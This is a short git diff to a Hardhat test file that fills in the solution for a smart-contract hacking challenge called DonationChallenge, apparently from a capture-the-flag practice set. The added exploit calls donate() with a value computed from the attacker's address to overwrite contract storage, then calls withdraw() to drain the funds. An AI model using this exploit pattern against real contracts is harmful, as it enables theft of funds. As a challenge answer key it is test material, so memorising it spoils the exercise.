@@ -1,6 +1,6 @@
 import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 import { expect } from 'chai';
-import { Contract } from 'ethers';
+import { BigNumber, Contract } from 'ethers';
 import { ethers } from 'hardhat';
 const { utils } = ethers;
 
@@ -24,9 +24,11 @@ describe('DonationChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    await target.donate(attacker.address, {
+      value: BigNumber.from(attacker.address).div(BigNumber.from(10).pow(36))
+    })
+
+    await target.withdraw()
 
     expect(await target.isComplete()).to.equal(true);
   });
